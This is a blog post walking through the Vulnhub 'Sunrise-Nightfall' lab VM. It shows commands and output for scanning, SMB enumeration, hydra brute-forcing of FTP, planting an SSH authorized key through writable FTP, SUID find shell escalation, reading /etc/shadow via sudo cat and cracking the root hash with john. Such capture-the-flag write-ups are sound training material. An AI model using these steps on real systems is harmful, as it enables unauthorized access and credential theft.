<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>crazyeights225</title>
   
    <link rel="stylesheet" href="../assets/bulma.min.css">
    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
    <style>
      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
    </style>
  </head>
  <body>
    <div id="app" class="mt-2">
        <nav class="navbar container" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
              <a class="navbar-item" href="/">
                <img src="../assets/logo.png">
              </a>
              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
              </a>
            </div>
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                    <a href="../index.html" class="navbar-item">Posts</a>
                    <a href="../projects.html" class="navbar-item">Projects</a>
              </div>
            </div>
          </nav>
    </div>
    <div class="hero-body mt-2" style="background-color: #285aff;">
        <div class="container has-text-centered">
            <h1 class="title" style="color: #f1f1f1;">
                Vulnhub: Sunrise-Nightfall
            </h1>
            <h2 class="subtitle" style="color: #f1f1f1;">
                Jan, 2021
            </h2>
        </div>
    </div>
</section>
<section class="container mt-2">
<div class="content column is-10">
    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
        <ul>
          <li><a href="../index.html">Posts</a></li>
          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
          <li class="is-active"><a href="#" aria-current="page">Sunrise-Nightfall</a></li>
        </ul>
      </nav>
<h3>Scanning:</h3>
<p>Begin by finding the machine on the network:</p>
<pre><code></span>crazyeights@es-base:~$ nmap -PS 192.168.0.1-255

Nmap scan report for 192.168.0.203
Host is up (0.00012s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
</span></code></pre>
<p>Find more details about running services. Only other important detail found was the domain name <code>nightfall</code></p>
<pre><code></span>crazyeights@es-base:~$ sudo nmap -sCSV 192.168.0.203
[SNIP]
</span></code></pre>
<h3>Web:</h3>
<ul>
<li>Nothing on the web server, just the default page.</li>
</ul>
<h3>SMB:</h3>
<ul>
<li>List available shares:</li>
</ul>
<pre><code></span>crazyeights@es-base:~$ smbclient -L \\nightfall -I 192.168.0.203 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
</span></code></pre>
<ul>
<li>There are no available shares, using enum4linux to find users:</li>
</ul>
<pre><code></span>enum4linux 192.168.0.203
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)
</span></code></pre>
<ul>
<li>
<p>we find two local users nightfall, and matt</p>
</li>
<li>
<p>Try to get the password for a user for another of the running services:</p>
</li>
</ul>
<pre><code></span>crazyeights@es-base:~$ hydra -l matt -P lists/rockyou-40.txt ftp://192.168.0.203
[SNIP]
[DATA] attacking ftp://192.168.0.203:21/
[21][ftp] host: 192.168.0.203   login: matt   password: cheese
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-05 17:48:17
crazyeights@es-base:~$ 
</span></code></pre>
<h3>FTP:</h3>
<ul>
<li>Login as matt:</li>
</ul>
<pre><code></span>crazyeights@es-base:~$ ftp 192.168.0.203
Connected to 192.168.0.203.
220 pyftpdlib 1.5.5 ready.
Name (192.168.0.203:crazyeights): matt
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
</span></code></pre>
<ul>
<li>Look for available files:</li>
</ul>
<pre><code></span>ftp&gt; ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-------   1 matt     matt            0 Aug 28  2019 .bash_history
-rw-r--r--   1 matt     matt          220 Aug 26  2019 .bash_logout
-rw-r--r--   1 matt     matt         3526 Aug 26  2019 .bashrc
drwx------   3 matt     matt         4096 Aug 28  2019 .gnupg
drwxr-xr-x   3 matt     matt         4096 Aug 26  2019 .local
-rw-r--r--   1 matt     matt          807 Aug 26  2019 .profile
-rw-------   1 matt     matt            0 Aug 28  2019 .sh_history
226 Transfer complete.
</span></code></pre>
<ul>
<li>There is no interesting information in any of the files</li>
<li>The ftp servier is writable though</li>
<li>Create a folder .ssh to add our public key as an authorized key allowing for us to login via SSH:</li>
</ul>
<pre><code></span>ftp&gt; mkdir .ssh
257 &quot;/.ssh&quot; directory created.
ftp&gt; cd .ssh
250 &quot;/.ssh&quot; is the current directory.
ftp&gt; dir
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp&gt;
</span></code></pre>
<ul>
<li>create a public-private key pair with <code>ssh-keygen</code> if you do not have one already</li>
<li>Copy your public key to file authorized keys:</li>
</ul>
<pre><code></span>crazyeights@es-base:~$ cp .ssh/id_rsa.pub authorized_keys
</span></code></pre>
<ul>
<li>Upload the file authorized_keys to the folder .ssh on the ftp server:</li>
</ul>
<pre><code></span>ftp&gt; put authorized_keys
local: authorized_keys remote: authorized_keys
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
573 bytes sent in 0.01 secs (63.6961 kB/s)
ftp&gt; 
</span></code></pre>
<h3>User:</h3>
<ul>
<li>We can now login as matt via SSH:</li>
</ul>
<pre><code></span>crazyeights@es-base:~$ ssh matt@192.168.0.203
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

matt@nightfall:~$ 
</span></code></pre>
<p>There are only two users on the machine matt and nightfall:</p>
<pre><code></span>matt@nightfall:~$ ls /home
matt  nightfall
</span></code></pre>
<p>Find programs matt can run acting as a different user:</p>
<pre><code></span>matt@nightfall:~$ find / -perm /4000 2&gt;/dev/null
/scripts/find
</span></code></pre>
<p>The binary scripts/find seems promising:</p>
<pre><code></span>matt@nightfall:/scripts$ ls
find
</span></code></pre>
<p>Testing running it we determine it is the same as normal find:</p>
<pre><code></span>matt@nightfall:/scripts$ ./find / -name &quot;index.html&quot;
</span></code></pre>
<p>Like with normal find we can use the exec param to get a shell:</p>
<ul>
<li>Getting the user flag:</li>
</ul>
<pre><code></span>matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \; -quit
$ cd /home/nightfall
$ ls
user.txt
$ cat user.txt
97fb7140ca325ed96f67be3c9e30083d
</span></code></pre>
<h3>Root:</h3>
<ul>
<li>To elevate our privileges to that of the user nightfall we can copy the authorized_keys we made earlier to <code>nightfall/.ssh/authorized_keys</code> allowing us to login to SSH as nightfall:</li>
</ul>
<pre><code></span>matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \; -quit
$ id            
uid=1001(matt) gid=1001(matt) euid=1000(nightfall) egid=1000(nightfall) groups=1000(nightfall),1001(matt)
$ mkdir /home/nightfall/.ssh
$ cp /home/matt/.ssh/authorized_keys /home/nightfall/.ssh/authorized_keys
$ 
</span></code></pre>
<p>Logging in as nightfall:</p>
<pre><code></span>crazyeights@es-base:~$ ssh nightfall@192.168.0.203
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

Last login: Wed Aug 28 18:35:04 2019 from 192.168.1.182
nightfall@nightfall:~$ ls
user.txt
</span></code></pre>
<p>Find what programs the user nightfall can run with elevated privileges:</p>
<pre><code></span>nightfall@nightfall:~$ sudo -l
Matching Defaults entries for nightfall on nightfall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nightfall may run the following commands on nightfall:
    (root) NOPASSWD: /usr/bin/cat
</span></code></pre>
<ul>
<li>The user nightfall can run cat as root, meaning we can read all files as root</li>
<li>Reading the shadow file to retrieve passwords:</li>
</ul>
<pre><code></span>nightfall@nightfall:/tmp$ sudo cat /etc/shadow
root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7:::
</span></code></pre>
<ul>
<li>Copy the hash to a file and crack it using john:</li>
</ul>
<pre><code></span>crazyeights@es-base:~$ john --wordlist=lists/rockyou-40.txt -rules nightfall_root_pass 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
miguel2          (root)
1g 0:00:00:06 DONE (2021-01-05 20:07) 0.1587g/s 4876p/s 4876c/s 4876C/s IUBITA..mariajose2
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
crazyeights@es-base:~$ 
</span></code></pre>
<p>Login as root:</p>
<pre><code></span>nightfall@nightfall:/tmp$ su root
Password: 
</span></code></pre>
<p>Retrieve the root flag:</p>
<pre><code></span>root@nightfall:~# cat root_super_secret_flag.txt 
Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1
[SNIP]
Thank you for playing! - Felipe Winsnes (whitecr0wz)                                 

flag{9a5b21fc6719fe33004d66b703d70a39}

root@nightfall:~#
</span></code></pre>
<p>FIN.</p>
</div>
</section>
<footer class="footer">
    <div class="container">
        <div class="columns">
        </div>
    </div>
</footer>
</body>
</html>